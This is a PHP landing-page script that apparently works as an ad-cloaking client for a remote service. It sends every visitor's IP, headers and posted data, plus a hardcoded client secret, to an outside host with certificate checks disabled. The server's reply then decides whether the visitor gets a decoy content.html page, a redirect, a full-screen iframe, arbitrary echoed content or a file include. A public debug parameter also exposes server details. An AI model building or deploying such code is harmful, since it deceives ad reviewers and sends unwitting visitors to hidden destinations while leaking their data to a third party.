<?php
// ==========================================
// DEBUG BLOCK - START
// Visit your site with /?test_connection=1 to trigger this.
// ==========================================
if (isset($_GET['test_connection'])) {
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    
    echo "<h1>Palladium Connection Debugger</h1>";
    echo "<p><strong>PHP Version:</strong> " . phpversion() . "</p>";
    echo "<p><strong>Server Software:</strong> " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
    
    $url = 'https://rbl.palladium.expert';
    echo "<p><strong>Testing Connection to:</strong> $url</p>";
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Try setting to true in production if possible
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'PalladiumTester/1.0');
    
    // Verbose output for deep debugging
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    $verbose = fopen('php://temp', 'w+');
    curl_setopt($ch, CURLOPT_STDERR, $verbose);
    
    $result = curl_exec($ch);
    $info = curl_getinfo($ch);
    $error = curl_error($ch);
    $errno = curl_errno($ch);
    
    curl_close($ch);
    
    if ($errno) {
        echo "<h2 style='color:red'>Connection FAILED</h2>";
        echo "<p><strong>cURL Error ($errno):</strong> $error</p>";
    } else {
        echo "<h2 style='color:green'>Connection SUCCESS</h2>";
        echo "<p><strong>HTTP Code:</strong> " . $info['http_code'] . "</p>";
        echo "<p><strong>Response Size:</strong> " . strlen($result) . " bytes</p>";
        echo "<h3>Response Body (First 500 chars):</h3>";
        echo "<pre style='background:#f4f4f4;padding:10px;'>" . htmlspecialchars(substr($result, 0, 500)) . "</pre>";
    }
    
    echo "<h3>Verbose Log:</h3>";
    rewind($verbose);
    $verboseLog = stream_get_contents($verbose);
    echo "<pre style='background:#eee;padding:10px;'>" . htmlspecialchars($verboseLog) . "</pre>";
    
    exit; // Stop execution here for debug mode
}
// ==========================================
// DEBUG BLOCK - END
// ==========================================

$isTarget = (new RequestHandlerClient())->run();

if (!$isTarget) {
   require_once __DIR__ . '/content.html';
}

class RequestHandlerClient
{
    const SERVER_URL = 'https://rbl.palladium.expert';

    /**
     * @param int    $clientId
     * @param string $company
     * @param string $secret
     *
     * @return void
     * @throws \Exception
     */
    public function run()
    {
        $headers = [];
        $headers['request'] = $this->collectRequestData();
        $headers['jsrequest'] = $this->collectJsRequestData();
        $headers['server'] = $this->collectHeaders();
        $headers['auth']['clientId'] = 7622;
        $headers['auth']['clientCompany'] = "1l7f2fXv9kYvXsqFVFYR";
        $headers['auth']['clientSecret'] = "NzYyMjFsN2YyZlh2OWtZdlhzcUZWRllSY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==";
        $headers['server']['bannerSource'] = 'adwords';

        return $this->curlSend($headers);
    }

    /**
     * @param array<string, mixed> $params
     *
     * @return bool
     * @throws \Exception
     */
    public function curlSend(array $params)
    {
        $answer = false;
        $curl = curl_init(self::SERVER_URL);
        if ($curl) {
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));

            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
            curl_setopt($curl, CURLOPT_TIMEOUT, 4);
            curl_setopt($curl, CURLOPT_TIMEOUT_MS, 4000);
            curl_setopt($curl, CURLOPT_FORBID_REUSE, true);
            // Added User Agent to ensure better compatibility with Vercel/Cloud environments
            curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');

            $result = curl_exec($curl);
            if ($result) {
				$serverOut = json_decode(
					$result,
					true
				);
				$status = curl_getinfo($curl, CURLINFO_HTTP_CODE);

				if ($status == 200 && is_array($serverOut)) {
					$answer = $this->handleServerReply($serverOut);
					return $answer;
				}
			}
        }

		$this->getDefaultAnswer();
        return $answer;
    }

    protected function handleServerReply($reply)
    {
        $result = (bool) ($reply['result'] ? $reply['result'] : 0);

        if (
			isset($reply['mode']) &&
			(
				(isset($reply['target'])) ||
				(isset($reply['content']) && !empty($reply['content']))
			)
		) {
            $target = $reply['target'];
            $mode = $reply['mode'];
            $content = $reply['content'];

            if (preg_match('/^https?:/i', $target) && $mode == 3) {
                // do fallback to mode2
                $mode = 2;
            }

            if ($result && $mode == 1) {
				$this->displayIFrame($target);
				exit;
			} elseif ($result && $mode == 2) {
				header("Location: {$target}");
				exit;
			} elseif ($result && $mode == 3) {
				$target = parse_url($target);
				if (isset($target['query'])) {
					parse_str($target['query'], $_GET);
				}
				$this->hideFormNotification();
				require_once $this->sanitizePath($target['path']);
				exit;
			} elseif ($result && $mode == 4) {
				echo $content;
				exit;
			} else if (!$result && $mode == 5) {
				//
			} elseif ($mode == 6) {
				//
			} else {
				$path = $this->sanitizePath($target);
				if (!$this->isLocal($path)) {
					header("404 Not Found", true, 404);
				} else {
					$this->hideFormNotification();
					require_once $path;
				}
				exit;
			}
        }

        return $result;
    }

	private function hideFormNotification()
	{
		echo "";
		//echo "<script>if ( window.history.replaceState ) {window.history.replaceState( null, null, window.location.href );}</script>";
	}

	private function displayIFrame($target) {
		$target = htmlspecialchars($target);
		echo "<html>
                  <head>
                  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
                  </head>
                  <body>" .
                  $this->hideFormNotification() .
                  "<iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>
                  </body>
              </html>";
	}

    private function sanitizePath($path)
    {
        if ($path[0] !== '/') {
            $path = __DIR__ . '/' . $path;
        } else {
            $path = __DIR__ . $path;
        }
        return $path;
    }

    private function isLocal($path)
    {
        // do not validate url via filter_var
        $url = parse_url($path);

        if (!isset($url['scheme']) || !isset($url['host'])) {
            return true;
        } else {
            return false;
        }
    }


    /**
     * Get all HTTP server headers and few additional ones
     *
     * @return mixed
     */
    protected function collectHeaders()
    {
        $userParams = [
            'REMOTE_ADDR',
            'SERVER_PROTOCOL',
            'SERVER_PORT',
            'REMOTE_PORT',
            'QUERY_STRING',
            'REQUEST_SCHEME',
            'REQUEST_URI',
            'REQUEST_TIME_FLOAT',
            'X_FB_HTTP_ENGINE',
            'X_PURPOSE',
            'X_FORWARDED_FOR',
            'X_WAP_PROFILE',
            'X-Forwarded-Host',
            'X-Forwarded-For',
            'X-Frame-Options',
        ];

        $headers = [];
        foreach ($_SERVER as $key => $value) {
            if (in_array($key, $userParams) || substr_compare('HTTP', $key, 0, 4) == 0) {
                $headers[$key] = $value;
            }
        }

        return $headers;
    }

    private function collectRequestData(): array
    {
        $data = [];
        if (!empty($_POST)) {
            if (!empty($_POST['data'])) {
            	$data = json_decode($_POST['data'], true);
            	if (JSON_ERROR_NONE !== json_last_error()) {
            		$data = json_decode(
						stripslashes($_POST['data']),
						true
					);
            	}
                unset($_REQUEST['data']);
            }

            if (!empty($_POST['crossref_sessionid'])) {
                $data['cr-session-id'] = $_POST['crossref_sessionid'];
                unset($_POST['crossref_sessionid']);
            }
        }

        return $data;
    }

    public function collectJsRequestData(): array
    {
        $data = [];
        if (!empty($_POST)) {
            if (!empty($_POST['jsdata'])) {
                $data = json_decode($_POST['jsdata'], true);
                if (JSON_ERROR_NONE !== json_last_error()) {
                    $data = json_decode(
                        stripslashes($_POST['jsdata']),
                        true
                    );
                }
                unset($_REQUEST['jsdata']);
            }
        }
        return $data;
    }

    /**
     * Default answer for the curl request in case of fault
     *
     * @return bool
     */
    private function getDefaultAnswer()
    {
        // Modified to return false so we can fallback to content.html instead of error page
        // If you prefer the error page, uncomment the lines below and remove 'return false'
        
		/*
		header($_SERVER["SERVER_PROTOCOL"] . ' 500 Internal Server Error', true, 500);
		echo "<h1>500 Internal Server Error</h1>
		<p>The request was unsuccessful due to an unexpected condition encountered by the server.</p>";
		exit;
		*/
		
		return false; 
    }
}
?>